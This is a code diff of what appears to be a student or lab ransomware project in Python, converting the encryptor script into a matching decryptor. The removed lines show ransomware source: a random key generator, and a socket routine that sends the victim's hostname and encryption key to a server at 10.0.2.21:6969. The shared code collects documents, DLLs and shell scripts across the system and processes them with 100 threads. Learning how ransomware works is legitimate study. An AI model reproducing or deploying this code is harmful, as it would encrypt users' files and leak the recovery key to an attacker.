@@ -1,5 +1,4 @@
-import os, platform, random, socket, sys, threading
-from datetime import datetime 
+import sys, threading, platform, os
 
 ### COLLECT FUNCTION ###
 def collect(extension_tuple):
@@ -22,36 +21,8 @@ def collect(extension_tuple):
 
     return file_list
 
-### KEY FUNCTION ####
-def keygen():
-# generate key
-    key = ""
-    encryption_level = 128 // 8
-    charpool = ""
-    for i in range(0x00, 0xFF):
-        charpool += (chr(i))
-    for i in range(encryption_level):
-        key += random.choice(charpool)
-    return key, encryption_level
-
-
-### CONENCTION FUNCTION ###
-def connection(ip, port, generated_key): # takes a string IP, int port and string key arguments
-# server connection. send hostname and key
-    hostname = os.getenv("COMPUTERNAME")
-    server_ip = ip #"10.0.2.15"
-    server_port = port #6969
-    key = generated_key
-    time = datetime.now()
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # create socket object
-    s.connect((server_ip, server_port))                         # connect to server
-    s.send((f'[{time}] - {hostname} Key:{key}').encode("UTF-8"))    # send info
-    s.close()                                                   # and dip out
-
-
-### ENCRYPT FUNCTION ###
-def encrypt(file, key, encryption_level):
+### DECRYPT FUNCTION ###
+def decrypt(file, key, encryption_level):
     # TODO: encryption logic here
     index = 0
     max_index = encryption_level - 1
@@ -76,21 +47,27 @@ def encrypt(file, key, encryption_level):
         #print("Error: ", e)
     except:
         print("Something went wrong :c")
-    
 
 def main():
+    # Read the content of the .key file passed as an argument and store it
+    try:
+        with open(sys.argv[1], "r") as k:
+            key = k.read()
+            print("The encryption key is: " + key) 
+    except IndexError:
+        print("Please specify the .key file as a positional argument")
+        print("Example: python3 ransom-decrypt.py <IP>.key")
+        quit()
 
-    # safeguard for testing purposes
-    safeguard = input("Are you sure you want to run this? If yes enter start: ")
+    safeguard = input("Are you sure you want to use this key? Type start if you are: ")
     if safeguard != "start":
         quit()
+
+    encryption_level = 128 // 8 
 
     # collect all files with matching extensions from the system into a list
     extensions = (".txt", ".pdf", ".odt", ".doc", ".docx", ".dll", ".sh")
     file_list = collect(extensions)
-
-    key, encryption_level = keygen() # generate key
-    connection("10.0.2.21", 6969, key) # sends info to server
 
     NUM_THREADS = 100 
     # Empty the threads list 
@@ -98,7 +75,7 @@ def main():
 
     # Create a thread for each file and add it to the list of threads
     for f in file_list:
-      thread = threading.Thread(target=encrypt, args=(f, key, encryption_level))
+      thread = threading.Thread(target=decrypt, args=(f, key, encryption_level))
       threads.append(thread)
 
     # Start the first NUM_THREADS threads
@@ -117,6 +94,6 @@ def main():
     for thread in threads:
       thread.join()
 
+
 if __name__ == "__main__":
-    main() 
-    
+    main()
